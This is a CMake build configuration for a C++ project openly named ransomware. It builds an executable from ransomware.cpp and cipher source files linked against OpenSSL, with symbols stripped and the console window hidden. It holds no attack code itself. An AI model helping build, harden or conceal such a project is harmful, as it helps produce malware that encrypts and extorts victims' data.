cmake_minimum_required(VERSION 3.15)
project(RANSOMWARE VERSION 1.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

if(CMAKE_CXX_COMPILER_ID MATCHES "GNU" OR CMAKE_CXX_COMPILER_ID MATCHES "Clang")
    add_compile_options(-Os)
    add_compile_options(-ffunction-sections -fdata-sections)
    add_link_options(-Wl,--gc-sections -Wl,--strip-all -m64 -mwindows)
endif()

if(NOT OPENSSL_ROOT_DIR)
    set(OPENSSL_ROOT_DIR "E:\\OpenSSL-Win64") # change this thing here 
endif()
add_executable(ransomware
    ransomware.cpp
    functions/functions.cpp
    functions/cypher.cpp
)

target_include_directories(ransomware PRIVATE "E:/OpenSSL-Win64/include") #place you openssl directory

target_link_libraries(ransomware PRIVATE
    "E:/OpenSSL-Win64/lib/VC/x64/MT/libssl.lib" #pls place here your openssl directory
    "E:/OpenSSL-Win64/lib/VC/x64/MT/libcrypto.lib" #same thing here
)
